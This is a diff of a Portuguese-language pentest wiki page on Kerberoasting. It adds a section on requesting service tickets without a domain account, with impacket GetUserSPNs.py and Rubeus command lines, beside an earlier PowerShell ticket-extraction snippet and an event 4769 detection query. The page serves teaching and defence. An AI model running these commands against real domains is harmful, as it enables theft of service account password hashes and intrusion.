@@ -33,7 +33,7 @@ Portanto, para realizar o Kerberoasting, apenas uma conta de domínio que possa 
 
 {% hint style="warning" %}
 As ferramentas de **Kerberoasting** normalmente solicitam **`criptografia RC4`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque o RC4 é [**mais fraco**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) e mais fácil de quebrar offline usando ferramentas como o Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
-Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto os de AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.
+Hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto os AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.
 {% endhint %}
 
 #### **Linux**
@@ -72,7 +72,7 @@ Passos:
 3. Extraia o TGS da memória do sistema usando ferramentas como Mimikatz ou ProcDump.
 4. Analise o TGS extraído para obter informações sensíveis, como hashes de senha.
 
-Essa técnica é eficaz porque o TGS contém informações criptografadas que podem ser usadas para realizar ataques de força bruta offline e obter as senhas reais dos usuários. Portanto, é importante proteger a memória do sistema contra acesso não autorizado e implementar medidas de segurança adequadas para mitigar esse tipo de ataque.
+Essa técnica é eficaz porque o TGS contém informações criptografadas que podem ser usadas para realizar ataques de força bruta offline e obter as senhas dos usuários. Portanto, é importante proteger a memória do sistema contra acesso não autorizado e implementar medidas de segurança adicionais, como a autenticação multifator, para mitigar esse tipo de ataque.
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -155,6 +155,28 @@ O kerberoast é muito furtivo se for explorável
 * Use Contas de Serviço Gerenciadas (alteração automática de senha periodicamente e gerenciamento delegado de SPN)
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
+```
+## Kerberoast sem conta de domínio
+
+Em setembro de 2022, foi descoberta uma vulnerabilidade por [Charlie Clark](https://exploit.ph/), em que os ST (Service Tickets) podem ser obtidos por meio de uma solicitação KRB_AS_REQ sem a necessidade de controlar qualquer conta do Active Directory. Se um principal puder autenticar sem pré-autenticação (como no ataque AS-REP Roasting), é possível usá-lo para lançar uma solicitação **KRB_AS_REQ** e enganar a solicitação para pedir um **ST** em vez de um **TGT** criptografado, modificando o atributo **sname** na parte do corpo da solicitação.
+
+A técnica é totalmente explicada neste artigo: [post do blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+
+{% hint style="warning" %}
+Você deve fornecer uma lista de usuários, pois não temos uma conta válida para consultar o LDAP usando essa técnica.
+{% endhint %}
+
+#### Linux
+
+* [impacket/GetUserSPNs.py do PR #1413](https://github.com/fortra/impacket/pull/1413):
+```bash
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+```
+#### Windows
+
+* [GhostPack/Rubeus do PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+```bash
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
 **Mais informações sobre Kerberoasting em ired.team** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**e** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**
 
